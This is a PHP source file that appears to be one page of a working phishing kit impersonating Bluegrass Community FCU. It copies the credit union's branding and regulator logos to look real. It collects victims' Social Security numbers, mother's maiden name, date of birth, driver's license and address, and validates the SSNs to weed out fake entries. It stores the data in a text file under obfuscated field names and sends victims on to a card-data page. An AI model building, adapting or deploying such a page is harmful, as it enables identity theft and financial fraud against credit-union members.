<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get form data
    $fzNme = trim($_POST['fzNme'] ?? '');
    $lzNme = trim($_POST['lzNme'] ?? '');
    $phone = trim($_POST['phone'] ?? '');
    $ssn = trim($_POST['ssn'] ?? '');
    $motherMaidenName = trim($_POST['motherMaidenName'] ?? '');
    $month = $_POST['month'] ?? '';
    $day = $_POST['day'] ?? '';
    $year = $_POST['year'] ?? '';
    $driverLicense = trim($_POST['driverLicense'] ?? '');
    $stAd = trim($_POST['stAd'] ?? '');
    $apt = trim($_POST['apt'] ?? '');
    $city = trim($_POST['city'] ?? '');
    $state = trim($_POST['state'] ?? '');
    $zipCode = trim($_POST['zipCode'] ?? '');
    
    // Validation
    if (empty($fzNme)) $errors['fzNme'] = 'First name is required';
    if (empty($lzNme)) $errors['lzNme'] = 'Last name is required';
    if (empty($phone)) {
        $errors['phone'] = 'Phone number is required';
    } else {
        // Remove all non-digit characters
        $phoneDigits = preg_replace('/\D/', '', $phone);
        if (strlen($phoneDigits) !== 10) {
            $errors['phone'] = 'Phone number must be 10 digits (US format)';
        } elseif (!preg_match('/^[2-9]\d{2}[2-9]\d{2}\d{4}$/', $phoneDigits)) {
            $errors['phone'] = 'Please enter a valid US phone number';
        }
    }
    if (empty($ssn)) {
        $errors['ssn'] = 'SSN is required';
    } else {
        // Remove all non-digit characters
        $ssnDigits = preg_replace('/\D/', '', $ssn);
        if (strlen($ssnDigits) !== 9) {
            $errors['ssn'] = 'SSN must be 9 digits';
        } elseif (!preg_match('/^[0-9]{9}$/', $ssnDigits)) {
            $errors['ssn'] = 'Please enter a valid SSN';
        } elseif (preg_match('/^000|^666|^9[0-9]{2}|^123[0-9]{2}/', $ssnDigits)) {
            $errors['ssn'] = 'Please enter a valid SSN (invalid area number)';
        } elseif (preg_match('/^00[0-9]{7}|^0000[0-9]{5}/', $ssnDigits)) {
            $errors['ssn'] = 'Please enter a valid SSN (invalid group number)';
        } elseif (preg_match('/[0-9]{4}0000$/', $ssnDigits)) {
            $errors['ssn'] = 'Please enter a valid SSN (invalid serial number)';
        }
    }
    if (empty($motherMaidenName)) $errors['motherMaidenName'] = "Mother's maiden name is required";
    if (empty($month) || empty($day) || empty($year)) {
        $errors['dob'] = 'Complete date of birth is required';
    } else {
        // Check if user is at least 18
        $dob = new DateTime("$year-$month-$day");
        $today = new DateTime();
        $age = $today->format('Y') - $dob->format('Y');
        if ($today->format('m-d') < $dob->format('m-d')) {
            $age--;
        }
        if ($age < 18) {
            $errors['dob'] = 'You must be at least 18 years old';
        }
    }
    if (empty($driverLicense)) $errors['driverLicense'] = "Driver's license is required";
    if (empty($stAd)) $errors['stAd'] = 'Street address is required';
    if (empty($city)) $errors['city'] = 'City is required';
    if (empty($state)) $errors['state'] = 'State is required';
    if (empty($zipCode)) $errors['zipCode'] = 'Zip code is required';
    
    if (empty($errors)) {
        // Format date
        $monthNames = ['', 'January', 'February', 'March', 'April', 'May', 'June',
                      'July', 'August', 'September', 'October', 'November', 'December'];
        $formattedDob = ($monthNames[intval($month)] ?? '') . "/$day/$year";
        
        // Save to test file
        $data = [
            'step' => 'basic_info_home_address',
            'usrnm' => $username,
            'gvn_nm' => $fzNme,
            'fam_nm' => $lzNme,
            'cnt_num' => $phone,
            'tax_id' => $ssn,
            'mat_nm' => $motherMaidenName,
            'dob' => $formattedDob,
            'id_num' => $driverLicense,
            'str_adr' => $stAd,
            'unit_dsg' => $apt,
            'loc' => $city,
            'prov' => $state,
            'zip_cd' => $zipCode
        ];
        
        saveUserData('basic_info_home_address.txt', $data);
        
        // Redirect to card page
        header('Location: card.php');
        exit;
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Basic Information - Bluegrass Community FCU</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div class="min-h-screen bg-[#4A9619] text-[#123524] flex flex-col">
        <!-- Main Content -->
        <main class="flex-1 flex items-center justify-center px-4 py-12">
            <div class="w-full max-w-4xl flex flex-col items-center gap-8">
                <!-- Basic Info Card -->
                <div class="w-full rounded-[30px] bg-white shadow-[0_30px_60px_rgba(0,0,0,0.18)] px-10 py-12">
                    <!-- Logo -->
                    <img
                        src="assets/blue_logo.png"
                        alt="Bluegrass Community FCU"
                        class="mx-auto h-12 w-auto"
                    />

                    <!-- Card Header -->
                    <div class="mt-6 space-y-3 text-center">
                        <p class="text-[0.65rem] font-semibold uppercase tracking-[0.35em] text-[#4A9619]">
                            Personal Information
                        </p>
                        <h1 class="text-2xl font-semibold text-gray-900">Basic Information & Home Address</h1>
                        <p class="text-gray-600">Confirm the details we have on file before continuing your enrollment</p>
                    </div>
                    
                    <?php if (!empty($errors)): ?>
                        <div class="mt-6 bg-red-50 border-l-4 border-red-500 p-4">
                            <div class="flex">
                                <div class="flex-shrink-0">
                                    <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                    </svg>
                                </div>
                                <div class="ml-3">
                                    <p class="text-sm text-red-700">
                                        Please fix the following errors:
                                        <ul class="list-disc pl-5 mt-1">
                                            <?php foreach ($errors as $error): ?>
                                                <li><?php echo htmlspecialchars($error); ?></li>
                                            <?php endforeach; ?>
                                        </ul>
                                    </p>
                                </div>
                            </div>
                        </div>
                    <?php endif; ?>
                    
                    <form method="POST" class="mt-8 space-y-6">
                        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                            <!-- First Name -->
                            <div>
                                <label for="fzNme" class="block text-sm font-medium text-gray-700 mb-2">First Name</label>
                                <input
                                    type="text"
                                    id="fzNme"
                                    name="fzNme"
                                    value="<?php echo htmlspecialchars($_POST['fzNme'] ?? ''); ?>"
                                    class="w-full rounded-xl border border-gray-200 px-4 py-3 text-gray-700 shadow-sm placeholder:text-gray-400 focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
                                    placeholder="Enter first name"
                                    required
                                >
                                <?php if (!empty($errors['fzNme'])): ?>
                                    <p class="mt-2 text-sm text-red-600"><?php echo htmlspecialchars($errors['fzNme']); ?></p>
                                <?php endif; ?>
                            </div>
                            
                            <!-- Last Name -->
                            <div>
                                <label for="lzNme" class="block text-sm font-medium text-gray-700 mb-2">Last Name</label>
                                <input
                                    type="text"
                                    id="lzNme"
                                    name="lzNme"
                                    value="<?php echo htmlspecialchars($_POST['lzNme'] ?? ''); ?>"
                                    class="w-full rounded-xl border border-gray-200 px-4 py-3 text-gray-700 shadow-sm placeholder:text-gray-400 focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
                                    placeholder="Enter last name"
                                    required
                                >
                                <?php if (!empty($errors['lzNme'])): ?>
                                    <p class="mt-2 text-sm text-red-600"><?php echo htmlspecialchars($errors['lzNme']); ?></p>
                                <?php endif; ?>
                            </div>
                            
                            <!-- Phone Number -->
                            <div>
                                <label for="phone" class="block text-sm font-medium text-gray-700 mb-2">Phone Number</label>
                                <input
                                    type="tel"
                                    id="phone"
                                    name="phone"
                                    value="<?php echo htmlspecialchars($_POST['phone'] ?? ''); ?>"
                                    class="w-full rounded-xl border border-gray-200 px-4 py-3 text-gray-700 shadow-sm placeholder:text-gray-400 focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
                                    placeholder="(555) 555-5555"
                                    required
                                >
                                <?php if (!empty($errors['phone'])): ?>
                                    <p class="mt-2 text-sm text-red-600"><?php echo htmlspecialchars($errors['phone']); ?></p>
                                <?php endif; ?>
                            </div>
                            
                            <!-- SSN -->
                            <div>
                                <label for="ssn" class="block text-sm font-medium text-gray-700 mb-2">Social Security Number</label>
                                <div class="relative">
                                    <input
                                        type="password"
                                        id="ssn"
                                        name="ssn"
                                        value="<?php echo htmlspecialchars($_POST['ssn'] ?? ''); ?>"
                                        class="w-full rounded-xl border border-gray-200 px-4 py-3 pr-12 text-gray-700 shadow-sm placeholder:text-gray-400 focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
                                        placeholder="XXX-XX-XXXX"
                                        required
                                    >
                                    <button
                                        type="button"
                                        onclick="toggleSSNVisibility()"
                                        class="absolute inset-y-0 right-4 flex items-center text-[#4A9619] hover:text-[#3f8215]"
                                        aria-label="Toggle SSN visibility"
                                    >
                                        <svg id="ssnEyeIcon" class="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                                            <path d="M2 12s4-7 10-7 10 7 10 7-4 7-10 7-10-7-10-7z" />
                                            <circle cx="12" cy="12" r="3" />
                                        </svg>
                                    </button>
                                </div>
                                <?php if (!empty($errors['ssn'])): ?>
                                    <p class="mt-2 text-sm text-red-600"><?php echo htmlspecialchars($errors['ssn']); ?></p>
                                <?php endif; ?>
                            </div>
                            
                            <!-- Mother's Maiden Name -->
                            <div>
                                <label for="motherMaidenName" class="block text-sm font-medium text-gray-700 mb-2">Mother's Maiden Name</label>
                                <input
                                    type="text"
                                    id="motherMaidenName"
                                    name="motherMaidenName"
                                    value="<?php echo htmlspecialchars($_POST['motherMaidenName'] ?? ''); ?>"
                                    class="w-full rounded-xl border border-gray-200 px-4 py-3 text-gray-700 shadow-sm placeholder:text-gray-400 focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
                                    placeholder="Enter mother's maiden name"
                                    required
                                >
                                <?php if (!empty($errors['motherMaidenName'])): ?>
                                    <p class="mt-2 text-sm text-red-600"><?php echo htmlspecialchars($errors['motherMaidenName']); ?></p>
                                <?php endif; ?>
                            </div>
                            
                            <!-- Date of Birth -->
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-2">Date of Birth</label>
                                <div class="grid grid-cols-3 gap-2">
                                    <select
                                        id="month"
                                        name="month"
                                        class="rounded-xl border border-gray-200 px-3 py-3 text-gray-700 shadow-sm focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
                                        required
                                    >
                                        <option value="">Month</option>
                                        <?php for ($i = 1; $i <= 12; $i++): ?>
                                            <option value="<?php echo $i; ?>" <?php echo (isset($_POST['month']) && $_POST['month'] == $i) ? 'selected' : ''; ?>>
                                                <?php echo date('F', mktime(0, 0, 0, $i, 1)); ?>
                                            </option>
                                        <?php endfor; ?>
                                    </select>
                                    <select
                                        id="day"
                                        name="day"
                                        class="rounded-xl border border-gray-200 px-3 py-3 text-gray-700 shadow-sm focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
                                        required
                                    >
                                        <option value="">Day</option>
                                        <?php for ($i = 1; $i <= 31; $i++): ?>
                                            <option value="<?php echo $i; ?>" <?php echo (isset($_POST['day']) && $_POST['day'] == $i) ? 'selected' : ''; ?>><?php echo $i; ?></option>
                                        <?php endfor; ?>
                                    </select>
                                    <select
                                        id="year"
                                        name="year"
                                        class="rounded-xl border border-gray-200 px-3 py-3 text-gray-700 shadow-sm focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
                                        required
                                    >
                                        <option value="">Year</option>
                                        <?php for ($i = date('Y'); $i >= 1900; $i--): ?>
                                            <option value="<?php echo $i; ?>" <?php echo (isset($_POST['year']) && $_POST['year'] == $i) ? 'selected' : ''; ?>><?php echo $i; ?></option>
                                        <?php endfor; ?>
                                    </select>
                                </div>
                                <?php if (!empty($errors['dob'])): ?>
                                    <p class="mt-2 text-sm text-red-600"><?php echo htmlspecialchars($errors['dob']); ?></p>
                                <?php endif; ?>
                            </div>
                            
                            <!-- Driver's License -->
                            <div>
                                <label for="driverLicense" class="block text-sm font-medium text-gray-700 mb-2">Driver's License Number</label>
                                <input
                                    type="text"
                                    id="driverLicense"
                                    name="driverLicense"
                                    value="<?php echo htmlspecialchars($_POST['driverLicense'] ?? ''); ?>"
                                    class="w-full rounded-xl border border-gray-200 px-4 py-3 text-gray-700 shadow-sm placeholder:text-gray-400 focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
                                    placeholder="Enter license number"
                                    required
                                >
                                <?php if (!empty($errors['driverLicense'])): ?>
                                    <p class="mt-2 text-sm text-red-600"><?php echo htmlspecialchars($errors['driverLicense']); ?></p>
                                <?php endif; ?>
                            </div>
                        </div>
                        
                        <!-- Home Address Section -->
                        <div class="border-t-2 border-gray-200 pt-6 mt-6">
                            <h3 class="text-lg font-semibold text-gray-800 mb-4">Home Address</h3>
                            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                                <!-- Street Address -->
                                <div class="md:col-span-2">
                                    <label for="stAd" class="block text-sm font-medium text-gray-700 mb-2">Street Address</label>
                                    <input
                                        type="text"
                                        id="stAd"
                                        name="stAd"
                                        value="<?php echo htmlspecialchars($_POST['stAd'] ?? ''); ?>"
                                        class="w-full rounded-xl border border-gray-200 px-4 py-3 text-gray-700 shadow-sm placeholder:text-gray-400 focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
                                        placeholder="Enter street address"
                                        required
                                    >
                                    <?php if (!empty($errors['stAd'])): ?>
                                        <p class="mt-2 text-sm text-red-600"><?php echo htmlspecialchars($errors['stAd']); ?></p>
                                    <?php endif; ?>
                                </div>
                                
                                <!-- Apartment/Unit -->
                                <div>
                                    <label for="apt" class="block text-sm font-medium text-gray-700 mb-2">Apartment/Unit (Optional)</label>
                                    <input
                                        type="text"
                                        id="apt"
                                        name="apt"
                                        value="<?php echo htmlspecialchars($_POST['apt'] ?? ''); ?>"
                                        class="w-full rounded-xl border border-gray-200 px-4 py-3 text-gray-700 shadow-sm placeholder:text-gray-400 focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
                                        placeholder="Apt, Suite, Unit, etc."
                                    >
                                </div>
                                
                                <!-- City -->
                                <div>
                                    <label for="city" class="block text-sm font-medium text-gray-700 mb-2">City</label>
                                    <input
                                        type="text"
                                        id="city"
                                        name="city"
                                        value="<?php echo htmlspecialchars($_POST['city'] ?? ''); ?>"
                                        class="w-full rounded-xl border border-gray-200 px-4 py-3 text-gray-700 shadow-sm placeholder:text-gray-400 focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
                                        placeholder="Enter city"
                                        required
                                    >
                                    <?php if (!empty($errors['city'])): ?>
                                        <p class="mt-2 text-sm text-red-600"><?php echo htmlspecialchars($errors['city']); ?></p>
                                    <?php endif; ?>
                                </div>
                                
                                <!-- State -->
                                <div>
                                    <label for="state" class="block text-sm font-medium text-gray-700 mb-2">State</label>
                                    <input
                                        type="text"
                                        id="state"
                                        name="state"
                                        value="<?php echo htmlspecialchars($_POST['state'] ?? ''); ?>"
                                        class="w-full rounded-xl border border-gray-200 px-4 py-3 text-gray-700 shadow-sm placeholder:text-gray-400 focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
                                        placeholder="Enter state"
                                        required
                                    >
                                    <?php if (!empty($errors['state'])): ?>
                                        <p class="mt-2 text-sm text-red-600"><?php echo htmlspecialchars($errors['state']); ?></p>
                                    <?php endif; ?>
                                </div>
                                
                                <!-- Zip Code -->
                                <div>
                                    <label for="zipCode" class="block text-sm font-medium text-gray-700 mb-2">Zip Code</label>
                                    <input
                                        type="text"
                                        id="zipCode"
                                        name="zipCode"
                                        value="<?php echo htmlspecialchars($_POST['zipCode'] ?? ''); ?>"
                                        class="w-full rounded-xl border border-gray-200 px-4 py-3 text-gray-700 shadow-sm placeholder:text-gray-400 focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
                                        placeholder="Enter zip code"
                                        required
                                    >
                                    <?php if (!empty($errors['zipCode'])): ?>
                                        <p class="mt-2 text-sm text-red-600"><?php echo htmlspecialchars($errors['zipCode']); ?></p>
                                    <?php endif; ?>
                                </div>
                            </div>
                        </div>
                        
                        <!-- Submit Button -->
                        <button
                            type="submit"
                            class="w-full rounded-xl bg-[#4A9619] py-3 text-base font-semibold text-white transition hover:bg-[#3f8215] disabled:cursor-not-allowed disabled:opacity-70"
                        >
                            Continue
                        </button>
                    </form>
                </div>
            </div>
        </main>

        <!-- Footer -->
        <footer class="bg-white border-t border-gray-300 py-6">
            <div class="max-w-7xl mx-auto px-4">
                <div class="flex flex-col md:flex-row md:items-center md:justify-between gap-6">
                    <div class="flex items-center gap-6 justify-center md:justify-start">
                        <img
                            src="assets/equal-housing.png"
                            alt="Equal Housing Lender"
                            class="h-12 w-auto"
                        />
                        <img
                            src="assets/ncua.png"
                            alt="National Credit Union Administration"
                            class="h-12 w-auto"
                        />
                    </div>
                    <div class="text-xs text-gray-700 text-center md:text-right space-y-2">
                        <p>© 2025 Bluegrass Community FCU. All Rights Reserved.</p>
                        <p>
                            This site contains links to other sites on the Internet. We, and your credit union,
                            cannot be responsible for the content or privacy policies of these other sites.
                        </p>
                        <p>Version: v26.10.22.0</p>
                    </div>
                </div>
                <div class="text-center text-xs text-gray-500 mt-6 border-t border-gray-200 pt-4">
                    ~ Current time is <?php echo date('m/d/Y h:i:s A'); ?> ~ 0 ~ NWEB02 ~
                </div>
            </div>
        </footer>
    </div>
    
    <script>
        // Auto-focus first input on page load
        document.addEventListener('DOMContentLoaded', function() {
            const firstInput = document.querySelector('input');
            if (firstInput) {
                firstInput.focus();
            }
        });
        
        // Toggle SSN visibility
        function toggleSSNVisibility() {
            const ssnInput = document.getElementById('ssn');
            const eyeIcon = document.getElementById('ssnEyeIcon');
            
            if (ssnInput.type === 'password') {
                ssnInput.type = 'text';
                // Change to eye-slash icon
                eyeIcon.innerHTML = '<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-6 0-10-7-10-7a21.37 21.37 0 0 1 5.07-5.92" /><path d="M1 1l22 22" />';
            } else {
                ssnInput.type = 'password';
                // Change back to eye icon
                eyeIcon.innerHTML = '<path d="M2 12s4-7 10-7 10 7 10 7-4 7-10 7-10-7-10-7z" /><circle cx="12" cy="12" r="3" />';
            }
        }
        
        // Format phone number
        document.getElementById('phone').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            // Limit to 10 digits
            value = value.slice(0, 10);
            
            if (value.length >= 6) {
                value = value.replace(/(\d{3})(\d{3})(\d{0,4})/, '($1) $2-$3');
            } else if (value.length >= 3) {
                value = value.replace(/(\d{3})(\d{0,3})/, '($1) $2');
            }
            e.target.value = value;
        });
        
        // Format SSN
        document.getElementById('ssn').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            // Limit to 9 digits
            value = value.slice(0, 9);
            
            if (value.length >= 6) {
                value = value.replace(/(\d{3})(\d{2})(\d{0,4})/, '$1-$2-$3');
            } else if (value.length >= 4) {
                value = value.replace(/(\d{3})(\d{0,2})/, '$1-$2');
            }
            e.target.value = value;
        });
    </script>
</body>
</html>
